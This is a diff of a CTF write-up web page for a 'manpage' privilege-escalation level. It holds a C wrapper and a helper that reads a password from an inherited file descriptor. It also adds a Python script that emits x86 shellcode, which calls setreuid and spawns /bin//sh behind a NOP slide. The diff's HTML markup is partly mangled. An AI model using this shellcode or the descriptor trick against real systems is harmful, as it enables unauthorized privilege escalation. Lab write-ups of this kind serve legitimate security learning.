@@ -4,7 +4,7 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=cbdd8a6193c6d93e3fe2b2349fcd6a262aeb14c8">
     <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
 
 <!-- Begin Jekyll SEO tag v2.8.0 -->
@@ -44,44 +44,119 @@
 
     <div class="container">
       <section id="main_content">
-        <p>in this level we can exploit the fact it leaves the file open, and also we can execute our code using the last line that reruns the file, with <code class="language-plaintext highlighter-rouge">excel</code>.</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-#include</span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">"Usage: %s &lt;input&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="p">}</span>
+        <p>in this level we can exploit the fact it leaves the file open, and also we can execute our code using the last line that reruns the file, with <code class="language-plaintext highlighter-rouge">excel</code>.
+&lt;!– ```c
+#include<stdio.h>
+#include<unistd.h></unistd.h></stdio.h></p>
 
-    <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span> <span class="o">=</span> <span class="s">"/manpage/manpage2"</span><span class="p">;</span>
-    <span class="kt">char</span> <span class="o">*</span><span class="n">new_argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">};</span>
-    <span class="n">execv</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">new_argv</span><span class="p">);</span>
+<p>int main(int argc, char *argv[]) {
+    if(argc &lt; 2) {
+        printf(“Usage: %s <input />\n”, argv[0]);
+        return 1;
+    }</p>
 
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="c1">// gcc -m32 level2.c -o level2</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>char *pathname = "/manpage/manpage2";
+char *new_argv[] = {argv[1], NULL};
+execv(pathname, new_argv);
 
+return 0; } // gcc -m32 level2.c -o level2
 </code></pre></div></div>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
-    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
-    <span class="kt">char</span> <span class="n">pass</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
 
-    <span class="k">if</span><span class="p">(</span><span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">"Error: lseek failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">pass</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">"Error: read failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="p">}</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>```c
+#include&lt;stdio.h&gt;
 
-    <span class="n">printf</span><span class="p">(</span><span class="s">"Password: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pass</span><span class="p">);</span>
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="c1">// gcc -m32 read_pass.c -o read_pass</span>
+int main(){
+    int fd = 3;
+    char pass[32];
+
+    if(lseek(fd, 0, 0) == -1){
+        printf("Error: lseek failed\n");
+        return 1;
+    }
+    if(read(fd, pass, 32) == -1){
+        printf("Error: read failed\n");
+        return 1;
+    }
+
+    printf("Password: %s\n", pass);
+    return 0;
+}
+// gcc -m32 read_pass.c -o read_pass
+
+``` --&gt;
+```python
+import sys
+
+NOP_SLIDE = 50
+
+print = lambda *args, **kwargs: None # override print function
+
+
+# setreuid(geteuid(), geteuid())
+# execv("/bin//sh", argv)
+
+# Shellcode in Python
+shellcode = (
+    b"\x6a\x31"  # push 0x31 (49)
+    b"\x58"      # pop eax
+    b"\xcd\x80"  # int 0x80 (geteuid())
+
+    b"\x40"      # inc eax
+    b"\x89\xc3"  # mov ebx, eax (uid + 1)
+    b"\x6a\x17"  # push 0x17 (23)
+    b"\x58"      # pop eax
+    b"\xcd\x80"  # int 0x80, setuid16(uid + 1)
+
+    b"\x89\xd9"  # mov ecx, ebx
+    b"\x6a\x46"  # push 0x46 (70)
+    b"\x58"      # pop eax
+    b"\xcd\x80"  # int 0x80, setreuid(uid + 1, uid + 1)
+
+    b"\x31\xd2"  # xor edx, edx
+    b"\x52"      # push edx, which is \0
+    b"\x68\x2f\x2f\x73\x68"  # push "//sh"
+    b"\x68\x2f\x62\x69\x6e"  # push "/bin"
+    b"\x89\xe3"  # mov ebx, esp (now ebx contains: "/bin//sh",\x00)
+
+    b"\x52"      # push edx (push NULL into stack)
+    b"\x53"      # push ebx (push pathname)
+    b"\x89\xe1"  # mov ecx, esp (ecx is argv)
+
+    b"\xb0\x0b"  # mov al, 0x0b (11)
+    b"\xcd\x80"  # int 0x80 (execv("/bin//sh", argv))
+
+        # mv eax, 1         ; system call number (sys_exit)
+    b"\x6a\x01"  # push 1
+    b"\x58"      # pop eax (sys_exit)
+    # int 0x80
+    b"\xcd\x80"  # int 0x80 (exit())
+)
+
+# Print shellcode details
+print("Shellcode code is:")
+print("setreuid(geteuid(), geteuid())")
+print("execv(\"/bin//sh\", argv)")
+
+# Print shellcode with NOP slide
+print("\nShellcode as formatted string:")
+
+# Add NOP slide (\x90) before shellcode
+nop_slide = b"\x90" * NOP_SLIDE
+formatted_shellcode = nop_slide + shellcode
+
+# Convert to formatted string
+formatted_string = "".join(f"\\x{byte:02x}" for byte in formatted_shellcode)
+print(formatted_string)
+
+# Print shellcode in hex format
+print("\nShellcode in hex format:")
+print("".join(f"{byte:02x}" for byte in formatted_shellcode))
+
+# Calculate shellcode length
+print(f"\nLength of shellcode is {len(formatted_shellcode)} bytes")
+
+sys.stdout.buffer.write(formatted_shellcode)
+# export SHELLCODE=$(python3 shellcode.py)
 
 </code></pre></div></div>
 
